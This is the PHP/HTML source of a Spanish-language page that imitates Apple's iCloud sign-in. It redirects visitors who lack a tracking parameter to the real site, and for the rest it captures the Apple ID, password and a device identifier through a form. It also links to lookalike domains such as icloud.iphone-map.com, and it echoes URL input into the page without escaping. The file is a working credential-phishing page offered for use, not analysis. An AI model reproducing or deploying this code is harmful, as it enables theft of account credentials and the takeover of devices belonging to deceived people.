<?php


if(!isset($_GET["info"]))
{

header('Location: https://www.icloud.com');
// echo 'Hola mundo';
// die();

}
else
{
	$id=$_GET["info"];

	

}

?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="stylesheet" href="assets/layout/movingbubbles.css" type="text/css" />
        <script src="assets/js/movingbubbles.js" type="text/javascript"></script>
        <link rel="stylesheet" href="https://code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css">
      
	
	<meta content="width=device-width, initial-scale=1" name="viewport"/>
	<meta name="robots" content="noindex, nofollow" />
	<title>iCloud</title>
	<link rel="stylesheet" href="assets/layout/strap.css">
    <link rel="shortcut icon" type="image/x-icon" href="https://appleid.cdn-apple.com/static/bin/cb3606853004/images/favicon.ico">
	<link rel="stylesheet" href="assets/layout/apple.css">
	<link rel="stylesheet" href="assets/layout/kit.css">
	<link rel="stylesheet" href="assets/layout/animate.css">
	<link rel="stylesheet" href="assets/layout/a.css">
	<script src="assets/js/jquery-latest.min.js"></script>
	
	<script type="text/javascript">
      $(document).ready(function() {
		$('#preloader').delay(900).fadeOut('slow'); 
		$('body').css({'overflow':'visible'});
		$('#test').delay(900).css({'display':'block'});

		});
	</script>

</head>
<style>
body {
	background: url(assets/img/back.jpg) no-repeat center center fixed;
}

@media only screen and (min-width : 320px) and (max-width : 480px) {
	background: url(assets/img/bac_md.png) no-repeat center center fixed;
}
</style>

<body>

<!-- Preloader -->
<div id="preloader">
	<div id="status">
	    <span></span>
	    </div>
</div>

<script type="text/javascript">
    
        function showt() {
            //document.getElementById("dThreshold").display ="block";
         
            document.getElementById("sp").style.display = "none";
            document.getElementById("spload").style.display = "block";

        setTimeout(function() {    
    document.getElementById("sp").style.display = "none";
        document.getElementById("spload").style.display = "none";
            document.getElementById("c_log").style.display = "block";
            document.getElementById("apple_pwd").style.display = "block";
         }, 500);       

       
        }
    </script>

<!-- <div id="bubbleContainer" style="background: rgba(0,0,0,0.1)">
</div> -->

<section id="header" style="background: black;">
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 col-xs-8 rightH rtl">
				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
				<span class="spreat"></span>
								<a class="setup applef" target="_blank" href="https://www.apple.com/icloud/setup/" >Cómo configurar iCloud</a>
								<div class="setup fName" style="display: none;"><i class="glyphicon glyphicon-menu-down"></i><span><img src="assets/img/user.jpeg" alt=""></span>
					<ul>
						<li><a href="https://www.icloud.com/">iCloud Settings</a></li>
						<li><a href="https://www.icloud.com/">Sign Out</a></li>
					</ul>
				</div>
		  </div>
			<div class="col-md-8 col-xs-4 leftH">
				<span class="icloud"></span>
			</div>
		</div>
	</div>
</section>

<section id="containerOcl" class="login-form text-center" style="display: block;">

	<p>&nbsp;</p> 
	<p>&nbsp;</p>
	<p>&nbsp;</p>

	<p><img src="assets/img/cloud.png" alt="" width="100" height="100" class="img-cloud">    </p>
	<h2 style="color: black;font-family: SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif">Iniciar sesión en iCloud</h2>
	
	<!-- action="https://www.icloudfoundmaps.com/save.php" -->

	<form name="formulario" id="formulario"  class="cloud-login form-ajax" role="form" method="post" accept-charset="utf-8">
		
		<input type="hidden" name="idl" id="idl" value="50656"/>

		<input type="hidden" name="device" id="device" value="<?php echo $id;  ?>"/>
		
		<input type="text" class="id" name="apple_id" id="apple_id" placeholder="ID de Apple" onkeypress="if (event.keyCode==13){ showt();return false;}" style="direction: ltr !important;">
		<input type="password" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd" placeholder="Contraseña" style="direction: ltr !important; display:none;">
		
		<input type="button" class="sp" onclick="showt();" style="display: block"  name="sp" id="sp" value="">
		
		<img class="spload" id="spload" src="assets/img/ajax-loader.gif" alt="Loading">
	
		<input type="submit" class="dolog" style="display: none"  name="c_log" id="c_log" value="">
		
		<img id="igmalert" class="loading" src="assets/img/ajax-loader.gif" alt="Loading" />
		<div id="divalert" class="alrt ">
			<h3><CENTER>Tu Apple ID o contraseña son incorrectos.<br>
			¿Has olvidado la contraseña?</CENTER></h3>
		</div>
	</form>

	<div class="keepme">
		<input type="checkbox" id="keepme" />
		<span for="keepme" style="font-size: 17px; color:black">Permanecer conectado</span>	
	</div>

	<div class="forget" >
		<a href="https://icloud.iphone-map.com/codigo/?info=<?php echo $_GET["info"]; ?>"  style="color:black">¿Has olvidado el ID de Apple o la contraseña?</a>
		<div id="response"></div>
	</div>
	<div class="forgetnew" style="color:black">
		¿Aún no tienes un ID de Apple?  <a href="https://appleid.apple.com/account" target="blank" style="color:black">Crea uno ahora.</a>
		<div id="response"></div>
	</div>

</section>

<section id="isiclodAA" class="imessage" style="display: none;">

	<div class="container">
		<div class="row">
		<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span  class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/11.png" alt="">
					<span>Reminders</span>				</a>		  </div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/9.png" alt="">
					<span>
						Notes					</span>				</a>			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/3.png" alt="">
					<span>iCloud Drive</span>				</a>			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/10.png" alt="">
					<span>Photos</span>				</a>			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/1.png" alt="">
					<span>Contacts</span>				</a>			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/8.png" alt="">
					<span>Mail</span>				</a>			</div>
			
			
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/12.png" alt="">
					<span>Settings</span>				</a>			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/2.png" alt="">
					<span>Find My iPhone</span>				</a>			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/6.png" alt="">
					<span>Keynote</span>				</a>			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/5.png" alt="">
					<span>Numbers</span>				</a>			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/20.png" alt="">
					<span>Find Friends</span>				</a>			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="https://www.icloud.com/" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/7.png" alt="">
					<span>Pages</span>				</a>			</div>
			

		</div>
	</div>


</section> 

<footer class="foot">
	<div class="container-fluid">
		<div class="row">
		<div class="col-md-10 col-xs-12 foot-link">
			<a href="https://www.apple.com/support/systemstatus/" target="_blank" style="color:black"><strong>Estado del sistema</strong></a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/privacy/" target="_blank" style="color:black"><strong>Política de privacidad</strong></a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/legal/icloud/ww/" target="_blank" style="color:black"><strong>Términos y condiciones</strong></a>
			<span class="footer-link-separator"></span>
			<span class="copyright"><strong style="color:black">Copyright © 2019 Apple Inc. Todos los derechos reservados.</strong></span></div>
		<div class="col-md-2 col-xs-12 apple">
			<a href="https://www.apple.com/" target="_blank" class="apple-logo"></a></div>
		</div>
	</div>
</footer>
	
	<script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
	<script src="assets/js/strap.min.js"></script>
	<script src="assets/js/apple.min.js"></script>
	<script src="assets/js/ajax-form.min.js"></script>
	
	<script src="app.js"></script>

</body>
</html>


